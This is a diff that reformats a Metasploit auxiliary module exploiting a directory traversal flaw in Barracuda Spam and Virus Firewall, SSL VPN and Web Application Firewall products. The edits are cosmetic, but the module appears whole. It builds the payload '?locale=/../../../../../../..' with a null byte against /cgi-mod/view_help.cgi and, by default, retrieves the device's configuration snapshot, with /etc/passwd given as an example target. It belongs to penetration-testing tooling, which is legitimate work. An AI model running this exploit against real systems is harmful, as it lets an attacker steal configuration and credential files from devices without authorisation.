@@ -10,36 +10,35 @@ class MetasploitModule < Msf::Auxiliary
 
   def initialize
     super(
-      'Name'           => 'Barracuda Multiple Product "locale" Directory Traversal',
-      'Description'    => %q{
+      'Name' => 'Barracuda Multiple Product "locale" Directory Traversal',
+      'Description' => %q{
           This module exploits a directory traversal vulnerability present in
         several Barracuda products, including the Barracuda Spam and Virus Firewall,
         Barracuda SSL VPN, and the Barracuda Web Application Firewall. By default,
         this module will attempt to download the Barracuda configuration file.
       },
-      'References'     =>
-        [
-          ['OSVDB', '68301'],
-          ['URL', 'https://web.archive.org/web/20101004131244/http://secunia.com/advisories/41609/'],
-          ['EDB', '15130']
-        ],
-      'Author'         =>
-        [
-          'Tiago Ferreira <tiago.ccna[at]gmail.com>'
-        ],
+      'References' => [
+        ['OSVDB', '68301'],
+        ['URL', 'https://web.archive.org/web/20101004131244/http://secunia.com/advisories/41609/'],
+        ['EDB', '15130']
+      ],
+      'Author' => [
+        'Tiago Ferreira <tiago.ccna[at]gmail.com>'
+      ],
       'DisclosureDate' => 'Oct 08 2010',
-      'License'        =>  MSF_LICENSE
+      'License' => MSF_LICENSE
     )
 
     register_options(
       [
         Opt::RPORT(8000),
-        OptString.new('FILE', [ true,  "Define the remote file to view, ex:/etc/passwd", '/mail/snapshot/config.snapshot']),
+        OptString.new('FILE', [ true, 'Define the remote file to view, ex:/etc/passwd', '/mail/snapshot/config.snapshot']),
         OptString.new('TARGETURI', [true, 'Barracuda vulnerable URI path', '/cgi-mod/view_help.cgi']),
-      ])
+      ]
+    )
   end
 
-  def run_host(ip)
+  def run_host(_ip)
     uri = normalize_uri(target_uri.path)
     file = datastore['FILE']
     payload = "?locale=/../../../../../../..#{file}%00"
@@ -48,18 +47,19 @@ class MetasploitModule < Msf::Auxiliary
 
     res = send_request_raw(
       {
-        'method'  => 'GET',
-        'uri'     => uri + payload,
-      }, 25)
+        'method' => 'GET',
+        'uri' => uri + payload
+      }, 25
+    )
 
     if res.nil?
       print_error("#{full_uri} - Connection timed out")
       return
     end
 
-    if (res.code == 200 and res.body)
-      if res.body.match(/\<html\>(.*)\<\/html\>/im)
-        html = $1
+    if ((res.code == 200) && res.body)
+      if res.body.match(%r{<html>(.*)</html>}im)
+        html = ::Regexp.last_match(1)
 
         if res.body =~ /barracuda\.css/
           if html.length > 100
@@ -81,7 +81,6 @@ class MetasploitModule < Msf::Auxiliary
     else
       print_error("#{full_uri} - Barracuda - Unrecognized #{res.code} response")
     end
-
   rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
   rescue ::Timeout::Error, ::Errno::EPIPE
   end
